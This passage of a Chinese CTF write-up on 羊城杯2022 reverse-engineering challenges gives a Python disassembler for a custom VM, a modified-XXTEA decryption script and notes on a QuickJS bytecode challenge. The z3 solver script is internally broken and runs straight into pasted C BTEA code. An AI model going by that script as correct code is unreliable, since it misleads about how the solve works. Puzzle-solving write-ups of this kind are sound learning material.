class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xFB</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x09</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0x04</span>, <span class="number">0x0C</span>, <span class="number">0x01</span>, <span class="number">0x54</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0xF1</span>, <span class="number">0x04</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0xF8</span>, <span class="number">0xF7</span>, <span class="number">0xF6</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0xFB</span>, <span class="number">0xF4</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0xB2</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0xF8</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x05</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, <span class="number">0xF4</span>, </span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0x0B</span>, <span class="number">0xE1</span>, <span class="number">0xF4</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xD7</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = [<span class="number">0</span>]*<span class="number">17</span></span><br><span class="line">mem = [<span class="number">0x123</span>,<span class="number">0x234</span>,<span class="number">0x345</span>,<span class="number">0x456</span>]</span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    v4 = r[<span class="number">16</span>]</span><br><span class="line">    r[<span class="number">16</span>] = v4+<span class="number">1</span></span><br><span class="line">    result = opcode[v4]-<span class="number">0xF1</span></span><br><span class="line">    <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">        v1 = r[<span class="number">16</span>]</span><br><span class="line">        v2 = opcode[v1]</span><br><span class="line">        v3 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">0xe0</span>:</span><br><span class="line">            r[<span class="number">16</span>] = v1+<span class="number">3</span></span><br><span class="line">            v4 = r[opcode[v1+<span class="number">2</span>]]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;r[<span class="subst">&#123;v3&#125;</span>] = r[<span class="subst">&#123;opcode[v1+<span class="number">2</span>]&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v4 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span>(v2&lt;&lt;<span class="number">24</span>):</span><br><span class="line">                r[<span class="number">16</span>] = v1+<span class="number">3</span></span><br><span class="line">                v2 -= <span class="number">1</span></span><br><span class="line">                v4 = opcode[v1+<span class="number">2</span>] | (v4&lt;&lt;<span class="number">8</span>)</span><br><span class="line">                v1 += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;r[<span class="subst">&#123;v3&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(v4)&#125;</span>&#x27;</span>)</span><br><span class="line">        r[v3] = v4</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">1</span>:</span><br><span class="line">        v1 = r[<span class="number">16</span>]</span><br><span class="line">        tmp = v1</span><br><span class="line">        v2 = opcode[v1]</span><br><span class="line">        v3 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        v4 = opcode[v1+<span class="number">2</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> r[v2] == r[v3]:</span><br><span class="line">            v5 = v1+<span class="number">3</span>+v4</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;jmp <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> v5==<span class="number">512</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">hex</span>(mem[i]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v5 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> v4:</span><br><span class="line">                r[<span class="number">16</span>] = v1+<span class="number">4</span></span><br><span class="line">                v4 -= <span class="number">1</span></span><br><span class="line">                v5 = opcode[v1+<span class="number">3</span>] | (v5&lt;&lt;<span class="number">8</span>)</span><br><span class="line">                v1 += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;if r[<span class="subst">&#123;v2&#125;</span>] != r[<span class="subst">&#123;v3&#125;</span>]: jmp <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        r[<span class="number">16</span>] = v5</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">2</span>:</span><br><span class="line">        v1 = r[<span class="number">16</span>]</span><br><span class="line">        v2 = opcode[v1]</span><br><span class="line">        v3 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        v4 = r[v3]</span><br><span class="line">        v5 = v1+<span class="number">4</span>*v4</span><br><span class="line">        v6 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">4</span>,<span class="number">0</span>,<span class="number">1</span>):</span><br><span class="line">            r[<span class="number">16</span>] = v5+<span class="number">3</span></span><br><span class="line">            v6 = opcode[v5+<span class="number">2</span>] | v6&lt;&lt;<span class="number">8</span></span><br><span class="line">            v5 += <span class="number">1</span></span><br><span class="line">        <span class="comment"># v6 = opcode[v5+2]&lt;&lt;24 | opcode[v5+3]&lt;&lt;16 | opcode[v5+4]&lt;&lt;8 | opcode[v5+5]</span></span><br><span class="line">        r[<span class="number">16</span>] = v5 - <span class="number">4</span>*r[v3]+<span class="number">14</span></span><br><span class="line">        r[v2] = v6</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v2&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(v6)&#125;</span>   opcode[v1+4*r[opcode[v1+1]]+2]&lt;&lt;24 | opcode[v1+4*r[opcode[v1+1]]+3]&lt;&lt;16 | opcode[v1+4*r[opcode[v1+1]]+4]&lt;&lt;8 | opcode[v1+4*r[opcode[v1+1]]+5]&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">3</span>:</span><br><span class="line">        v2 = r[<span class="number">16</span>]</span><br><span class="line">        v3 = opcode[v2]</span><br><span class="line">        v4 = opcode[v2+<span class="number">1</span>]</span><br><span class="line">        v5 = r[v4]</span><br><span class="line">        r[<span class="number">16</span>] = v2+<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> opcode[v2+<span class="number">2</span>]==<span class="number">0xe2</span>:</span><br><span class="line">            mem[v5] = r[v3]</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v2)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;mem[<span class="subst">&#123;v5&#125;</span>] = r[<span class="subst">&#123;v3&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r[v3] = mem[v5]</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v2)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v3&#125;</span>] = mem[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">13</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(r[<span class="number">16</span>])+<span class="string">&#x27;:\treturn&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">14</span>:</span><br><span class="line">        v1 = r[<span class="number">16</span>]</span><br><span class="line">        v3 = v1+<span class="number">2</span></span><br><span class="line">        v4 = opcode[v1]</span><br><span class="line">        v5 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> v4 == <span class="number">0xe0</span>:</span><br><span class="line">            v6 = v1+<span class="number">3</span></span><br><span class="line">            r[<span class="number">16</span>] = v1+<span class="number">3</span></span><br><span class="line">            v7 = r[opcode[v1+<span class="number">2</span>]]</span><br><span class="line">            s = <span class="string">f&#x27;r[<span class="subst">&#123;opcode[v1+<span class="number">2</span>]&#125;</span>]&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v7 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span>(v4&lt;&lt;<span class="number">24</span>):</span><br><span class="line">                r[<span class="number">16</span>] = v3+<span class="number">1</span></span><br><span class="line">                v4 -= <span class="number">1</span></span><br><span class="line">                v7 = opcode[v3] | (v7&lt;&lt;<span class="number">8</span>)</span><br><span class="line">                v3 += <span class="number">1</span></span><br><span class="line">            s = <span class="built_in">hex</span>(v7)</span><br><span class="line">            v6 = v3</span><br><span class="line">        r[<span class="number">16</span>] = v6+<span class="number">1</span></span><br><span class="line">        res = opcode[v6]-<span class="number">0xff</span>-<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> res == -<span class="number">11</span>:</span><br><span class="line">            r[v5] = (r[v5] +v7)&amp;<span class="number">0xffffffff</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] += &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">10</span>:</span><br><span class="line">            r[v5] = (r[v5] - v7) &amp;<span class="number">0xffffffff</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] -= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">9</span>:</span><br><span class="line">            r[v5] *= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] *= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">8</span>:</span><br><span class="line">            r[v5] //= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] //= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">7</span>:</span><br><span class="line">            r[v5] &lt;&lt;= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] &lt;&lt;= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">6</span>:</span><br><span class="line">            r[v5] &gt;&gt;= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] &gt;&gt;= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">5</span>:</span><br><span class="line">            r[v5] ^= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] ^= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">4</span>:</span><br><span class="line">            r[v5] |= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] |= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">3</span>:</span><br><span class="line">            r[v5] &amp;= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] &amp;= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">&#x27;wrong2&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(r[<span class="number">16</span>])+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">&#x27;wrong&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>（其中mem即为输入，手动代了几个数字方便调试）</p>
<p>按照流程，打印出7000+行代码，大致观察发现有明显的xxtea的特征，delta=0xf4f3f2f1，循环64轮，key=[0xf1f2f3f4,0xf5f6f7f8,0xf9fafbfc,0xfdfefff0]</p>
<p>![25](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\25.png)</p>
<p>解密无果，猜测有魔改，结果在开头和结尾又发现了一些加密。</p>
<p>开头将输入调换位置</p>
<p>![img](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\26.png)</p>
<p>结尾异或0xf8f7f6f5并调换位置</p>
<p>![img](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\27.png)</p>
<p>解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">0x55D37604</span>, <span class="number">0xB5FFA19E</span>, <span class="number">0xC202F734</span>, <span class="number">0x963BE91F</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    a[i] ^= <span class="number">0xf8f7f6f5</span></span><br><span class="line">t = a[<span class="number">3</span>]</span><br><span class="line">a[<span class="number">3</span>] = a[<span class="number">0</span>]</span><br><span class="line">a[<span class="number">0</span>] = t</span><br><span class="line">t = a[<span class="number">1</span>]</span><br><span class="line">a[<span class="number">1</span>] = a[<span class="number">2</span>]</span><br><span class="line">a[<span class="number">2</span>] = t</span><br><span class="line">a2 = [<span class="number">0xf1f2f3f4</span>,<span class="number">0xf5f6f7f8</span>,<span class="number">0xf9fafbfc</span>,<span class="number">0xfdfefff0</span>]</span><br><span class="line">v5 = <span class="number">0xf4f3f2f1</span></span><br><span class="line"><span class="comment"># n = 52//len(a) + 6</span></span><br><span class="line">v8 = v5*<span class="number">64</span></span><br><span class="line">v9 = a[<span class="built_in">len</span>(a)-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    j = <span class="built_in">len</span>(a)-<span class="number">2</span></span><br><span class="line">    v9 = a[j]</span><br><span class="line">    v6 = (v8&gt;&gt;<span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">    a[<span class="built_in">len</span>(a)-<span class="number">1</span>] = (a[<span class="built_in">len</span>(a)-<span class="number">1</span>] - (((v9 ^ a2[v6 ^ ((j+<span class="number">1</span>) &amp; <span class="number">3</span>)]) + (a[<span class="number">0</span>] ^ v8)) ^ (((<span class="number">16</span> * v9) ^ (a[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * a[<span class="number">0</span>]) ^ (v9 &gt;&gt; <span class="number">5</span>))))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">while</span>(j&gt;<span class="number">0</span>):</span><br><span class="line">        v9 = a[j-<span class="number">1</span>]</span><br><span class="line">        a[j] = (a[j] - (((v9 ^ a2[v6 ^ (j &amp; <span class="number">3</span>)]) + (a[j+<span class="number">1</span>] ^ v8)) ^ (((<span class="number">16</span> * v9) ^ (a[j+<span class="number">1</span>] &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * a[j+<span class="number">1</span>]) ^ (v9 &gt;&gt; <span class="number">5</span>))))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        j -= <span class="number">1</span></span><br><span class="line">    v9 = a[<span class="built_in">len</span>(a)-<span class="number">1</span>]</span><br><span class="line">    a[<span class="number">0</span>] = (a[<span class="number">0</span>] - (((v9 ^ a2[v6 ^ (j &amp; <span class="number">3</span>)]) + (a[j+<span class="number">1</span>] ^ v8)) ^ (((<span class="number">16</span> * v9) ^ (a[j+<span class="number">1</span>] &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * a[j+<span class="number">1</span>]) ^ (v9 &gt;&gt; <span class="number">5</span>))))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    v8 -= v5</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">3</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>]:                               <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]&gt;&gt;<span class="number">24</span>&amp;<span class="number">0xff</span>),<span class="built_in">chr</span>(a[i]&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xff</span>),<span class="built_in">chr</span>(a[i]&gt;&gt;<span class="number">8</span>&amp;<span class="number">0xff</span>),<span class="built_in">chr</span>(a[i]&amp;<span class="number">0xff</span>),end=<span class="string">&#x27;&#x27;</span>,sep=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># 1t_i5_3z_i5nt_it</span></span><br></pre></td></tr></table></figure>
<h3 id="easyjs"><a class="markdownIt-Anchor" href="#easyjs"></a> <strong>easyjs</strong></h3>
<p>quickjs,下载源码编译输出字节码，具体参考<a href="https://bbs.pediy.com/thread-259014.htm">https://bbs.pediy.com/thread-259014.htm</a></p>
<p>字节码中首先观察到了初始化一些常量函数以及字符串</p>
<p>可以很明显的看到一个大小写互换的base64表</p>
<p>![img](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\28.png)</p>
<p>得到字节码开始分析eval函数，这个相当于正常的main函数</p>
<p>![img](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\29.png)</p>
<p>这里的意思应该是encode64（enc1（））的意思，所以先调用enc1，然后再调用encode64</p>
<p>enc1里面就是一个BTEA delta mx key都很容易知道，上网上扒一个代码实现就行了</p>
<p>后面是一个错位异或，</p>
<p>![img](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\30.png)</p>
<p>最后调用了func5 func6函数 func5函数是一个转大整数的方法，</p>
<p>![img](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\31.png)</p>
<p>func6里面主要是一堆的逻辑运算，然后与已知量比较，</p>
<p>![32](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\32.png)</p>
<p>将data3 15个数字分为三组，然后进行比较，拿z3解一下</p>
<p>总结一下就是先逆出来逻辑运算、然后是异或、base64、BTEA写脚本解就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">data3 = [<span class="number">5911837666743816200</span>,</span><br><span class="line"><span class="number">5133585975960501272</span>,</span><br><span class="line"><span class="number">9082418069800623372</span>,</span><br><span class="line"><span class="number">9154480062992383756</span>,</span><br><span class="line"><span class="number">6848599583376686600</span>,</span><br><span class="line"><span class="number">147787617043219975</span>,</span><br><span class="line"><span class="number">6140429622497212985</span>,</span><br><span class="line"><span class="number">2526269866358605591</span>,</span><br><span class="line"><span class="number">4552892036882908959</span>,</span><br><span class="line"><span class="number">4543304157965338119</span>,</span><br><span class="line"><span class="number">4620825451554930944</span>,</span><br><span class="line"><span class="number">8808899373961281307</span>,</span><br><span class="line"><span class="number">5924901230665995531</span>,</span><br><span class="line"><span class="number">8808899373961281307</span>,</span><br><span class="line"><span class="number">8662527953563041043</span>]</span><br><span class="line"></span><br><span class="line">data4 = [<span class="number">2101524238053948931</span>,</span><br><span class="line"><span class="number">9154814254531429383</span>,</span><br><span class="line"><span class="number">8941618984500083987</span>]</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    data5 = [BitVec(<span class="string">&quot;x%d&quot;</span> % i, <span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    x = data5[<span class="number">0</span>]</span><br><span class="line">    y = data5[<span class="number">1</span>]</span><br><span class="line">    z = data5[<span class="number">2</span>]</span><br><span class="line">    w = data5[<span class="number">3</span>]</span><br><span class="line">    a = ~x &amp; z</span><br><span class="line">    b = (z &amp; ~x | (x&amp;y) | (z &amp; (~y)) | (x &amp; (~y)) ) ^ w</span><br><span class="line">    c = (z &amp; ~y &amp; x)| (z &amp; ((x &amp; y) | (y &amp; (~x)) | ~(y | x)))</span><br><span class="line">    d = (z &amp; ~x) | (x &amp; y) | (z &amp; ~y) | (x &amp; ~y)</span><br><span class="line">    e = (z &amp; ~x) | (x&amp;y) | (y&amp;z)</span><br><span class="line">    s = Solver()</span><br><span class="line">    s.add(a == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(b == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(c == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(d == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(e == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(y == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.check()</span><br><span class="line">    m = s.model()</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data5:</span><br><span class="line">        res.append(<span class="built_in">int</span>(<span class="built_in">str</span>(m[i])))</span><br><span class="line">    <span class="comment">#print(res)</span></span><br><span class="line">    </span><br><span class="line">    aa = []</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">        k = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            k.append(r &amp; <span class="number">0xff</span>)</span><br><span class="line">            r &gt;&gt;= <span class="number">8</span></span><br><span class="line">        aa += k</span><br><span class="line">    data += aa</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(data)</span><br><span class="line"></span><br><span class="line">data[-<span class="number">1</span>] = data[-<span class="number">1</span>]^data[<span class="number">1</span>]</span><br><span class="line">data[-<span class="number">2</span>] = data[-<span class="number">2</span>]^data[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">3</span>, -<span class="number">1</span>)[::-<span class="number">1</span>]:</span><br><span class="line">    data[i] ^= data[i+<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(data))</span><br><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"> </span><br><span class="line">using namespace std;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#define DELTA 289739796</span></span><br><span class="line"><span class="comment">#define MX (((z &gt;&gt; 6) ^ (y &lt;&lt; 3)) + ((y &gt;&gt; 4) ^ (z &lt;&lt; 5)) ^ ((sum^y) + (secret[(p&amp;3)^e] ^ z)))  </span></span><br><span class="line"> </span><br><span class="line">  void btea(uint32_t *vector, <span class="built_in">int</span> n, uint32_t const secret[<span class="number">4</span>]) &#123;</span><br><span class="line">    uint32_t y, z, <span class="built_in">sum</span>;</span><br><span class="line">    unsigned p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;          </span><br><span class="line">      rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">      <span class="built_in">sum</span> = <span class="number">0</span>;</span><br><span class="line">      z = vector[n-<span class="number">1</span>];</span><br><span class="line">      do &#123;</span><br><span class="line">        <span class="built_in">sum</span> += DELTA;</span><br><span class="line">        e = (<span class="built_in">sum</span> &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n-<span class="number">1</span>; p++) &#123;</span><br><span class="line">          y = vector[p+<span class="number">1</span>];</span><br><span class="line">          z = vector[p] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        y = vector[<span class="number">0</span>];</span><br><span class="line">        z = vector[n-<span class="number">1</span>] += MX;</span><br><span class="line">      &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; -<span class="number">1</span>) &#123;  </span><br><span class="line">      n = -n;</span><br><span class="line">      rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">      <span class="built_in">sum</span> = rounds*DELTA;</span><br><span class="line">      y = vector[<span class="number">0</span>];</span><br><span class="line">      do &#123;</span><br><span class="line">        e = (<span class="built_in">sum</span> &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p=n-<span class="number">1</span>; p&gt;<span class="number">0</span>; p--) &#123;</span><br><span class="line">          z = vector[p-<span class="number">1</span>];</span><br><span class="line">          y = vector[p] -= MX;</span><br><span class="line">        &#125;</span><br><span class="line">        z = vector[n-<span class="number">1</span>];</span><br><span class="line">        y = vector[<span class="number">0</span>] -= MX;</span><br><span class="line">      &#125; <span class="keyword">while</span> ((<span class="built_in">sum</span> -= DELTA) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    char secret[<span class="number">17</span>] = <span class="string">&quot;welcometoycb2022&quot;</span>;</span><br><span class="line">    uint8_t buf[] = 